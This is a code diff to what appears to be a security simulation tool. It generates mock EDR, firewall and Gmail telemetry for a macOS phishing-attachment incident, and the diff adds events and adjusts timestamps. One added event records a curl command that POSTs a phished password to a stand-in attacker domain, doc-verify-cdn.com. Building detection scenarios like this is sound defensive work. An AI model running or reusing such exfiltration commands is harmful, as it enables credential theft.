@@ -29,6 +29,7 @@ export function gwsPhishingAttachmentScenarioEvents() {
   const droppedHash    = makeSha256("invoice_8842_lnk_dropper_payload_2026");
   const chromeHash     = makeSha256("google_chrome_helper_signed_binary_2026");
   const osascriptHash  = makeSha256("macos_usr_bin_osascript_apple_signed");
+  const curlHash       = makeSha256("macos_usr_bin_curl_apple_signed");
 
   // EDR↔scenario integration (Phase 4): ONE incident spanning two planes — the
   // email/identity side (Google Workspace delivery inside a real supplier thread,
@@ -87,8 +88,53 @@ export function gwsPhishingAttachmentScenarioEvents() {
     },
 
     // ---------------------------------------------------------------------
-    // 2. The user opens the attachment. Chrome writes a file to Downloads —
-    //    the HTML built it locally rather than fetching it.
+    // 2a. The user saves the HTML attachment from Gmail and opens it in Chrome.
+    // ---------------------------------------------------------------------
+    {
+      id: "evt_gws_01b_html_saved",
+      ts: T(13 * MIN + 52_000),
+      source: "edr",
+      vendor: "CrowdStrike Falcon",
+      event_type: "file_create",
+      hostname: host.hostname,
+      user_email: victim.email,
+      src_ip: host.ip,
+      severity: "low",
+      mitre_technique: "T1204.002",
+      mitre_tactic: "Execution",
+      description:
+        "At 08:44:52 Google Chrome wrote /Users/s.amir/Downloads/Invoice_8842.html — the same SHA256 as the attachment Gmail delivered at 08:31.",
+      file: {
+        name: "Invoice_8842.html",
+        path: "/Users/s.amir/Downloads/Invoice_8842.html",
+        extension: "html",
+        size: 241_102,
+        sha256: attachmentHash,
+      },
+      raw: {
+        "crowdstrike.event_simpleName": "FileWritten",
+        "crowdstrike.sensor.id": "f2b90d5417ae4c63b8107d92ea5f3c40",
+        "crowdstrike.platform": "Mac",
+        "event.action": "file_created",
+        "file.name": "Invoice_8842.html",
+        "file.path": "/Users/s.amir/Downloads/Invoice_8842.html",
+        "file.size": "241102",
+        "file.hash.sha256": attachmentHash,
+        "process.name": "Google Chrome",
+        "process.pid": "4412",
+        "process.executable": "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
+        "process.hash.sha256": chromeHash,
+        "user.name": victim.sam,
+        "host.name": host.hostname,
+        "host.os.family": "darwin",
+        "host.os.name": "macOS",
+        "host.ip": host.ip,
+      },
+    },
+
+    // ---------------------------------------------------------------------
+    // 2b. Eight seconds after the page opens, Chrome writes a .dmg to Downloads —
+    //     the HTML assembled it locally rather than fetching it.
     // ---------------------------------------------------------------------
     {
       id: "evt_gws_02_attachment_opened",
@@ -103,7 +149,7 @@ export function gwsPhishingAttachmentScenarioEvents() {
       mitre_technique: "T1027.006",
       mitre_tactic: "Defense Evasion",
       description:
-        "At 08:45 Google Chrome wrote /Users/s.amir/Downloads/Invoice_8842.dmg, 4.1 MB, with no preceding download request in the network log.",
+        "At 08:45 the same Google Chrome process wrote /Users/s.amir/Downloads/Invoice_8842.dmg, 4.1 MB; no network row shows a .dmg fetched from any host.",
       file: {
         name: "Invoice_8842.dmg",
         path: "/Users/s.amir/Downloads/Invoice_8842.dmg",
@@ -148,7 +194,7 @@ export function gwsPhishingAttachmentScenarioEvents() {
       mitre_technique: "T1204.002",
       mitre_tactic: "Execution",
       description:
-        "Finder mounted the disk image at 08:47:20 and launched Invoice Viewer.app from the mounted volume.",
+        "08:47:20 — Finder launched /Volumes/Invoice_8842/Invoice Viewer.app from the mounted disk image; the binary is unsigned and not notarized.",
       process: {
         name: "Invoice Viewer",
         pid: 5188,
@@ -161,13 +207,6 @@ export function gwsPhishingAttachmentScenarioEvents() {
       },
       raw: {
         "crowdstrike.event_simpleName": "ProcessRollup2",
-        "crowdstrike.detection.tactic": "Execution",
-        "crowdstrike.detection.tactic_id": "TA0002",
-        "crowdstrike.detection.technique": "User Execution: Malicious File",
-        "crowdstrike.detection.technique_id": "T1204.002",
-        "crowdstrike.detection.severity": "High",
-        "crowdstrike.detection.pattern_disposition": "10",
-        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
         "crowdstrike.sensor.id": "f2b90d5417ae4c63b8107d92ea5f3c40",
         "crowdstrike.platform": "Mac",
         "event.action": "process_created",
@@ -197,12 +236,11 @@ export function gwsPhishingAttachmentScenarioEvents() {
       hostname: host.hostname,
       user_email: victim.email,
       src_ip: host.ip,
-      severity: "critical",
+      severity: "high",
       mitre_technique: "T1059.002",
       mitre_tactic: "Execution",
-      is_detection: true, // alert-grade: the behavioural crux — an unnotarized app spawning osascript to exfil a phished password
       description:
-        "Four seconds later the app spawned /usr/bin/osascript running an AppleScript that presents a password dialog and pipes the answer to curl.",
+        "Four seconds later Invoice Viewer spawned /usr/bin/osascript with an AppleScript that shows a hidden-answer password dialog and then runs curl -X POST to doc-verify-cdn.com.",
       process: {
         name: "osascript",
         pid: 5203,
@@ -217,13 +255,6 @@ export function gwsPhishingAttachmentScenarioEvents() {
       },
       raw: {
         "crowdstrike.event_simpleName": "ProcessRollup2",
-        "crowdstrike.detection.tactic": "Execution",
-        "crowdstrike.detection.tactic_id": "TA0002",
-        "crowdstrike.detection.technique": "Command and Scripting Interpreter: AppleScript",
-        "crowdstrike.detection.technique_id": "T1059.002",
-        "crowdstrike.detection.severity": "Critical",
-        "crowdstrike.detection.pattern_disposition": "2048",
-        "crowdstrike.detection.pattern_disposition_description": "Detection, Process Killed",
         "crowdstrike.sensor.id": "f2b90d5417ae4c63b8107d92ea5f3c40",
         "crowdstrike.platform": "Mac",
         "event.action": "process_created",
@@ -245,11 +276,61 @@ export function gwsPhishingAttachmentScenarioEvents() {
     },
 
     // ---------------------------------------------------------------------
+    // 4b. 25 seconds later the dialog returns (the user clicked OK) and the
+    //     script's shell command runs: curl, child of osascript.
+    // ---------------------------------------------------------------------
+    {
+      id: "evt_gws_04b_curl",
+      ts: T(16 * MIN + 49_000),
+      source: "edr",
+      vendor: "CrowdStrike Falcon",
+      event_type: "process_create",
+      hostname: host.hostname,
+      user_email: victim.email,
+      src_ip: host.ip,
+      severity: "high",
+      mitre_technique: "T1056.002",
+      mitre_tactic: "Credential Access",
+      description:
+        "08:47:49 — osascript started /usr/bin/curl -s -X POST https://doc-verify-cdn.com/v/1, 25 seconds after the dialog appeared.",
+      process: {
+        name: "curl",
+        pid: 5219,
+        path: "/usr/bin/curl",
+        parent_name: "osascript",
+        parent_pid: 5203,
+        cmdline: "curl -s -X POST https://doc-verify-cdn.com/v/1 -d @-",
+        user: victim.sam,
+        integrity: "medium",
+        hash: { sha256: curlHash },
+      },
+      raw: {
+        "crowdstrike.event_simpleName": "ProcessRollup2",
+        "crowdstrike.sensor.id": "f2b90d5417ae4c63b8107d92ea5f3c40",
+        "crowdstrike.platform": "Mac",
+        "event.action": "process_created",
+        "process.name": "curl",
+        "process.pid": "5219",
+        "process.executable": "/usr/bin/curl",
+        "process.command_line": "curl -s -X POST https://doc-verify-cdn.com/v/1 -d @-",
+        "process.hash.sha256": curlHash,
+        "process.code_signature.subject_name": "Software Signing",
+        "process.code_signature.status": "trusted",
+        "process.parent.name": "osascript",
+        "process.parent.pid": "5203",
+        "user.name": victim.sam,
+        "host.name": host.hostname,
+        "host.os.family": "darwin",
+        "host.os.name": "macOS",
+      },
+    },
+
+    // ---------------------------------------------------------------------
     // 5. The outbound POST is refused at the perimeter.
     // ---------------------------------------------------------------------
     {
       id: "evt_gws_05_c2_blocked",
-      ts: T(16 * MIN + 25_000),
+      ts: T(16 * MIN + 49_400),
       source: "firewall",
       vendor: "FortiGate",
       event_type: "http_blocked",
@@ -260,7 +341,7 @@ export function gwsPhishingAttachmentScenarioEvents() {
       mitre_technique: "T1041",
       mitre_tactic: "Exfiltration",
       description:
-        "The POST to doc-verify-cdn.com/v/1 was denied by the web filter under the category Newly Observed Domain.",
+        "0.4 s later the FortiGate web filter blocked LAP-003's POST to doc-verify-cdn.com/v/1 (185.225.73.48) under the category Newly Observed Domain.",
       network: { url: `https://${c2}/v/1`, domain: c2, method: "POST", status: 0 },
       raw: {
         "data.type": "utm",
@@ -272,7 +353,7 @@ export function gwsPhishingAttachmentScenarioEvents() {
         "data.policyid": "17",
         "data.srcip": host.ip,
         "data.srcname": host.hostname,
-        "data.dstip": "23.129.64.211",
+        "data.dstip": "185.225.73.48",
         "data.dstport": "443",
         "data.hostname": c2,
         "data.url": "/v/1",
@@ -280,7 +361,7 @@ export function gwsPhishingAttachmentScenarioEvents() {
         "data.catdesc": "Newly Observed Domain",
         "data.cat": "90",
         "data.msg": "URL belongs to a denied category in policy",
-        "data.eventtime": String(new Date(T(16 * MIN + 25_000)).getTime() * 1_000_000),
+        "data.eventtime": String(new Date(T(16 * MIN + 49_400)).getTime() * 1_000_000),
         "rule.id": "81605",
         "rule.level": "6",
         "rule.description": "FortiGate: Web filter blocked URL",
@@ -293,7 +374,7 @@ export function gwsPhishingAttachmentScenarioEvents() {
     // ---------------------------------------------------------------------
     {
       id: "evt_gws_06_edr_alert",
-      ts: T(17 * MIN),
+      ts: T(16 * MIN + 50_000),
       source: "edr",
       vendor: "CrowdStrike Falcon",
       event_type: "edr_alert",
@@ -304,12 +385,12 @@ export function gwsPhishingAttachmentScenarioEvents() {
       is_detection: true,    // the Falcon detection — the endpoint alert that opens the ticket
       edr_scope: "hybrid",   // spans host (macOS execution chain) + email/identity (GWS delivery + tenant spread) → pivot to EDR for the host
       description:
-        "Falcon raised a Critical detection on LAP-003 for an unnotarized app from a mounted volume spawning osascript, and killed the osascript process.",
+        "08:47:50 — Falcon raised a Critical detection on LAP-003: osascript (parent Invoice Viewer on /Volumes/Invoice_8842) spawned curl POSTing to doc-verify-cdn.com; disposition Process Killed.",
       raw: {
         "crowdstrike.event_simpleName": "DetectionSummaryEvent",
         "crowdstrike.detection.name": "UnnotarizedAppSpawnsScriptInterpreter",
         "crowdstrike.detection.description":
-          "An unsigned application launched from a mounted disk image spawned osascript with an embedded shell command to a remote host.",
+          "An unsigned application launched from a mounted disk image spawned osascript, which displayed a password prompt and then spawned curl to a remote host.",
         "crowdstrike.detection.severity": "Critical",
         "crowdstrike.detection.confidence": "95",
         "crowdstrike.detection.tactic": "Execution",
@@ -342,7 +423,7 @@ export function gwsPhishingAttachmentScenarioEvents() {
       user_email: victim.email,
       severity: "medium",
       description:
-        "A mail-log search for this sender returns 41 delivered messages over 14 months, all authenticated, with attachment types recorded.",
+        "Gmail email log search, sender billing@northline-print.co.uk, 420 days: 41 delivered messages since 2025-05-08, SPF/DMARC 41/41 pass, attachment types application/pdf until this morning's text/html.",
       raw: {
         "gws.event.type": "email_log_search",
         "gws.query.sender": supplier.email,
@@ -359,37 +440,23 @@ export function gwsPhishingAttachmentScenarioEvents() {
         "event.outcome": "success",
       },
     },
-
-    // ---------------------------------------------------------------------
-    // 8. The same HTML attachment went to two other mailboxes in the tenant.
-    // ---------------------------------------------------------------------
-    {
-      id: "evt_gws_08_tenant_spread",
-      ts: T(24 * MIN),
-      source: "gws",
-      vendor: "Google Workspace",
-      event_type: "email_received",
-      severity: "high",
-      description:
-        "A search on the attachment hash finds the same file delivered to two further mailboxes in the tenant this morning, both still unopened.",
-      raw: {
-        "gws.event.type": "email_log_search",
-        "gws.query.attachment_sha256": attachmentHash,
-        "gws.result.message_count": "3",
-        "gws.result.recipients": [
-          "s.amir@rocketstack.io",
-          "finance@rocketstack.io",
-          "d.shapira@rocketstack.io",
-        ],
-        "gws.result.senders": [supplier.email],
-        "gws.result.delivered_between": ["2026-07-02T08:31:00Z", "2026-07-02T08:36:00Z"],
-        "gws.result.opened_count": "1",
-        "gws.result.classification": "INBOX",
-        "event.action": "log-search",
-        "event.outcome": "success",
-      },
-    },
   ];
+
+  // ---------------------------------------------------------------------
+  // 8. The same message (same Message-ID, same attachment SHA256) was delivered to
+  //    two more mailboxes in the tenant minutes after the first — Gmail's own
+  //    per-recipient delivery records, which a search on the hash returns.
+  // ---------------------------------------------------------------------
+  const first = events[0];
+  const copyTo = (id: string, ts: string, rcpt: string): TelemetryEvent => ({
+    ...first, id, ts, user_email: rcpt, user_title: undefined, severity: "medium",
+    description: `Gmail delivered the same reply from billing@northline-print.co.uk — same Message-ID, attachment Invoice_8842.html with the same SHA256 — to ${rcpt} at ${ts.slice(11, 16)}.`,
+    raw: { ...first.raw, "gws.recipient": rcpt, "user.email": rcpt },
+  });
+  events.splice(1, 0,
+    copyTo("evt_gws_08_tenant_spread", T(2 * MIN), "finance@rocketstack.io"),
+    copyTo("evt_gws_08b_tenant_spread", T(5 * MIN), "d.shapira@rocketstack.io"),
+  );
 
   // Every event — host EDR chain and GWS email plane alike — belongs to the one
   // phishing-attachment incident (the SIEM↔EDR correlation key).
